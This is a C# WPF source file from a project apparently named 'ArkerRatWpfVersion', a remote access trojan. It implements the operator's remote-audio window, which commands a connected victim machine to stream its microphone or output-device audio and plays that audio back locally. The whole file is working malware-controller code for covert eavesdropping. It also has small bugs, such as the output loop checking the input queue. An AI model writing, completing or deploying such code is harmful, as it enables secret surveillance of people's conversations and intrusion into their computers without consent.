using NAudio.Wave;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data.SqlTypes;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for RemoteAudioWindow.xaml
    /// </summary>
    public partial class RemoteAudioWindow : Window
    {
        public static RATHostSession clientSession { get; set; }
        public RemoteAudioWindow(RATHostSession session)
        {
            InitializeComponent();
            clientSession = session;
            windowText.Content += " - " + clientSession.clientInfo[0];
            clientSession.SendData("§RemoteAudioStart§§RemoteAudioEnd§");
            
            OutputSoundDeviceList.Items.Add("none");
            InputSoundDeviceList.Items.Add("none");

            OutputSoundDeviceList.SelectedItem = OutputSoundDeviceList.Items[0];
            InputSoundDeviceList.SelectedItem = InputSoundDeviceList.Items[0];

            OutputSoundDeviceList.SelectionChanged += SendOutputDeviceChoice;
            InputSoundDeviceList.SelectionChanged += SendInputDeviceChoice;


            outVolume.Minimum= 0;
            outVolume.Maximum= 1;
            inVolume.Minimum = 0;
            inVolume.Maximum = 1;

            outVolume.Value = 1;
            inVolume.Value = 1;

            clientSession.remoteAudioWindowIsAlreadyOpen = true;

            GlobalVariables.byteSize = 262144;
        }

        bool close = false;
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!close)
                e.Cancel = true;
        }

        public async void CloseWindow(object sender, RoutedEventArgs e)
        {
            clientSession.remoteAudioWindowIsAlreadyOpen = false;
            close = true;

            receiveOAudio = false;
            receiveIAudio= false;

            clientSession.SendData("§RemoteAudioStart§close§RemoteAudioEnd§");

            try
            {
                Task.WaitAll(ReceiveIATask);
            }
            catch (Exception) { }

            try
            {
                Task.WaitAll(ReceiveOATask);

            }
            catch (Exception) { }

            if (!clientSession.remoteDesktopWindowIsAlreadyOpen)
                GlobalVariables.byteSize = 1024;

            Close();
        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {

        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        Dictionary<string,string> friendlynameTodeviceId= new Dictionary<string,string>();
        public void AddODevices(string devices)
        {
            string[] tempArray = devices.Split(',');
            foreach (var device in tempArray)
            {
                string[] deviceInfo = device.Split('|');
                friendlynameTodeviceId.Add(deviceInfo[1], deviceInfo[0]);
                Application.Current.Dispatcher.InvokeAsync(() => OutputSoundDeviceList.Items.Add(deviceInfo[1]));
            }
        }

        public void AddIDevices(string devices)
        {
            string[] tempArray = devices.Split(',');
            foreach (var device in tempArray)
            {
                string[] deviceInfo = device.Split('|');
                friendlynameTodeviceId.Add(deviceInfo[1], deviceInfo[0]);
                Application.Current.Dispatcher.InvokeAsync(() => InputSoundDeviceList.Items.Add(deviceInfo[1]));
            }
        }

        private async void SendOutputDeviceChoice(object sender, SelectionChangedEventArgs e)
        {
            OutputSoundDeviceList.IsEnabled = false;
            await Task.Delay(100);

            receiveOAudio = false;

            if(ReceiveOATask!=null)
            Task.WaitAll(ReceiveOATask);

            ComboBox comboBox = (ComboBox)e.Source;
            string device = comboBox.SelectedItem.ToString();

            if(device == "none")
            {
                await clientSession.SendData("§RemoteAudioStart§§ODS§§RemoteAudioEnd§");
            }
            else
            {
                receiveOAudio= true;
                ReceiveOATask = Task.Run(() => ReceiveDecodeAndPlayClientOutputAudio());

                await clientSession.SendData("§RemoteAudioStart§§ODS§" + friendlynameTodeviceId[device] + "§RemoteAudioEnd§");
            }
            OutputSoundDeviceList.IsEnabled = true;
        }

        private async void SendInputDeviceChoice(object sender, SelectionChangedEventArgs e)
        {
            InputSoundDeviceList.IsEnabled = false;
            await Task.Delay(100);

            receiveIAudio = false;

            if(ReceiveIATask!= null)
            Task.WaitAll(ReceiveIATask);

            ComboBox comboBox = (ComboBox)e.Source;
            string device = comboBox.SelectedItem.ToString();

            if (device == "none")
            {
                await clientSession.SendData("§RemoteAudioStart§§IDS§§RemoteAudioEnd§");
            }
            else
            {
                receiveIAudio = true;

                ReceiveIATask = Task.Run(() =>ReceiveDecodeAndPlayClientInputAudio());

                await clientSession.SendData("§RemoteAudioStart§§IDS§" + friendlynameTodeviceId[device] + "§RemoteAudioEnd§");
            }

            InputSoundDeviceList.IsEnabled = true;

        }

        private ConcurrentQueue<string> oAudioQue = new ConcurrentQueue<string>();
        private ConcurrentQueue<string> iAudioQue = new ConcurrentQueue<string>();

        private BufferedWaveProvider cOWaveProvider = new BufferedWaveProvider(new WaveFormat(41100, 1));
        private BufferedWaveProvider cIWaveProvider = new BufferedWaveProvider(new WaveFormat(41100, 1));

       private bool receiveOAudio= false;
       private bool receiveIAudio = false;

        private Task ReceiveOATask;
        private Task ReceiveIATask;
        private async void ReceiveDecodeAndPlayClientInputAudio()
        {
            iAudioQue = new ConcurrentQueue<string>();
            cIWaveProvider.ClearBuffer();

            WaveOutEvent waveOutEvent = new WaveOutEvent();
            waveOutEvent.Init(cIWaveProvider);

            waveOutEvent.DeviceNumber = 0;

            waveOutEvent.Play();

            while (!clientSession.source.IsCancellationRequested && !close && receiveIAudio)
            {
                if (iAudioQue.Count > 10)
                {
                    iAudioQue = new ConcurrentQueue<string>();
                    cIWaveProvider.ClearBuffer();
                }

                await Application.Current.Dispatcher.InvokeAsync(() => waveOutEvent.Volume = Convert.ToSingle(inVolume.Value));

                string temp = string.Empty;
                if(iAudioQue.TryDequeue(out temp))
                {
                    byte[] soundData = Convert.FromBase64String(temp);

                    cIWaveProvider.AddSamples(soundData, 0, soundData.Length);
                }

                await Task.Delay(10);
            }
            waveOutEvent.Stop();
        }

        private async void ReceiveDecodeAndPlayClientOutputAudio()
        {
            oAudioQue = new ConcurrentQueue<string>();
            cOWaveProvider.ClearBuffer();

            WaveOutEvent waveOutEvent = new WaveOutEvent();
            waveOutEvent.Init(cOWaveProvider);

            waveOutEvent.DeviceNumber = 0;

            waveOutEvent.Play();
            while (!clientSession.source.IsCancellationRequested && !close && receiveOAudio)
            {
                if (iAudioQue.Count > 10)
                {
                    oAudioQue = new ConcurrentQueue<string>();
                    cOWaveProvider.ClearBuffer();
                }

                await Application.Current.Dispatcher.InvokeAsync(() => waveOutEvent.Volume = Convert.ToSingle(outVolume.Value));

                string temp = string.Empty;
                if (oAudioQue.TryDequeue(out temp))
                {
                    byte[] soundData = Convert.FromBase64String(temp);

                    cOWaveProvider.AddSamples(soundData, 0, soundData.Length);
                }

                await Task.Delay(10);
            }
            waveOutEvent.Stop();
        }

        public void EnqueAudioData(string data)
        {
            if (data.Contains("§OA§"))
            {
                data = data.Replace("§OA§", string.Empty);
                oAudioQue.Enqueue(data);
            }
            else if (data.Contains("§IA§"))
            {
                data = data.Replace("§IA§", string.Empty);
                iAudioQue.Enqueue(data);
            }
        }
    }
}
